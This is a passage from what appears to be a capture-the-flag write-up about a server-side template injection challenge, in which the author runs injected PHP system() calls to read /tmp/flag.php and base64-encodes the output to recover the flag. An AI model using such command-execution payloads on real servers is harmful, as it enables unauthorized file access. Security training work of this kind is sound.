and is a classic case of SSTI

The Challenge hint points us towards the location of flag in the system /tmp/flag.php
so already knowing the location
we simply run

system ('cat /tmp/flag.php');

which gives us blank results, initially thought to be a mistake, it was intended from admins side

so i checked for base64 which did the work
system ('cat /tmp/flag.php | base64');

on decoding base64 we got out final flag value !
